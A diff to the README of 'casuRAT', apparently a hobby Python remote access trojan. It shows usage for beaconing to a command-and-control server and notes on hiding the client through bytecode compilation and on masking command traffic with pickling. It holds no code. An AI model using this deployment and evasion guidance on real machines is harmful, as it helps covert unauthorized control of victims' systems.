@@ -4,7 +4,7 @@
 casuRAT and it's partner server are ran entirely off of standard modules. As long as there is a somewhat updated version of python3, all that needs to be done is upload the server.py to a server you control, upload casuRAT.py to targets, ensure they have execute permissions, and run them with the below arguements.  
   
 # Client Usage:  
-#### python3 ./casuRAT.py [rhost] [rport] [beacon_interval_seconds]  
+#### python3 ./casuRAT_compiled.py [rhost] [rport] [beacon_interval_seconds]  
   ##### rhost - The IP address of the C2 server  
   ##### rport - Listening port of the C2 server  
   ##### beacon_interval_seconds - The amount of time between attempts to communicate with the C2 server  
@@ -85,8 +85,8 @@ server.py
   -Maybe some day I'll get my hands dirty in C, but not today. Not satisfied.  
 ###### Leverage OOP  
   -Planning on restructuring code into classes to get true OOP experience. Not satisfied.  
-###### Obfuscate or encrypt client side code  
-  -Should be an easy task if taking the simple route. py_compile should be painless, although much better ways exist.
+###### ~~Obfuscate or encrypt client side code~~  
+  -Compiled with py_compile. Obfuscates the client script into byte-code. Running strings against it will still give a strong indication of its purpose, but it is better than nothing.
 ###### ~~Obfuscate or encrypt command & control traffic~~  
   -Traffic in both directions is serialized into a pickled object. This encodes the traffic across the wire making it less obvious that someone is running commands on a target machine. Pickle may come with a security implication or two, so JSON dumps instead may be a better choice in the future.  
 ###### Capable of traversing a web proxy. Not satisfied.  
